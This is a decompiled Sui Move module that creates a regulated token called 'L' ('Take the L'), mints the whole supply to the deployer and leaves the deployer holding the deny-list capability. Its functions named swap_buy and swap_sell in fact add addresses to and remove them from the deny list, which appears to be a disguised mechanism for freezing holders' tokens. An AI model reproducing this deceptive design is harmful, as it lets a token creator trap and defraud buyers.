module 0x608f0df1da992054d07a8ae5dab568721e2e6390d6e5ae9a0bc4556135fa3a3f::l {
    struct L has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: L, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<L>(arg0, 9, b"L", b"Take the L", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qma8kqdUJVk1oSgmkcT2Lovxm8fwAQBbdQ29pKjZeSNvRh"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<L>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<L>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<L>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<L>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<L>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<L>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<L>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<L>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

